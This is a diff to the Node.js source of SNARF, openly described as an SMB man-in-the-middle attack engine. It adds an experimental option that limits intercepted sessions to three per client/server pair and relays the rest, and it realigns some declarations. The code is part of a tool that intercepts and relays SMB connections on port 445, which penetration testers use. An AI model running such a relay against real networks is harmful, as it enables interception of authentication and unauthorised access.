@@ -62,9 +62,10 @@ out.red("SNARF - 0.2 - SMB Man in the Middle Attack Engine");
 out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (TBD)");
 
 getopt = new Getopt([
-    ['d', 'defaultip=IP'                , 'Default IP (think LLMNR or NBNS)'],
-    ['f', 'file=FILE'                   , 'Round-robin default destination from file'],
-    ['h', 'help',                       , 'Show help and usage statement']
+    ['d', 'defaultip=IP'  , 'Default IP (think LLMNR or NBNS)'],
+    ['f', 'file=FILE'     , 'Round-robin default destination from file'],
+    ['l', 'limit',        , 'Keep limit of 3 connections for each client/server pair (EXPERIMENTAL)'],
+    ['h', 'help',         , 'Show help and usage statement']
 ]);
 
 getopt.setHelp(
@@ -80,12 +81,12 @@ if(opt.argv.length != 1 || opt.options['help']) {
     process.exit(1);
 }
 
-var bindip = opt.argv[0];
-var router = new rout.Router(bindip);
-var broker = new SMBBroker();
-var client;
-var count = 0;
+var bindip  = opt.argv[0];
+var router  = new rout.Router(bindip);
+var broker  = new SMBBroker();
+var count   = 0;
 var globals = new Object;
+var client;
 
 //
 // One of the more useful features is the ability to send a request
@@ -138,16 +139,31 @@ client = net.createServer(function(sock) {
             }
         }
         out.red("Destination is " + tip);
+        out.red("Broker currently has " + broker.countDups(sock.remoteAddress, tip) + " similar connections");
+
         var server = net.connect({port: 445, host: tip}, function() {
-            out.red("Server connected, will relay to " + tip);
-            var middler = new midl.Middler(count);
-            count += 1;
-            middler.setClientInfo(sock.remoteAddress,sock.remotePort,tip);
-            middler.setBroker(broker);
-            broker.addMiddler(middler);
-            middler.setServer(server);
-            middler.setOriginalClient(sock);
-            sock.resume();
+            if(opt.options['limit'] && broker.countDups(sock.remoteAddress, tip) >= 3) {
+
+                // Sometimes, servers can get fussy if they have too
+                // many open sessions.  This is an EXPERIMENTAL
+                // feature to relay and then throw away any
+                // connections from / to clients / servers for which
+                // we already have three middlers.
+
+                out.red("Hit limit of 3 connections for " + sock.remoteAddress + " -> " + tip + ", relaying");
+                midl.Relay(sock, server);
+                sock.resume();
+            } else {
+                out.red("Server connected, will relay to " + tip);
+                var middler = new midl.Middler(count);
+                count += 1;
+                middler.setClientInfo(sock.remoteAddress,sock.remotePort,tip);
+                middler.setBroker(broker);
+                broker.addMiddler(middler);
+                middler.setServer(server);
+                middler.setOriginalClient(sock);
+                sock.resume();
+            }
         });
         server.on("error", function() {
             out.red("Server connection encountered an error");
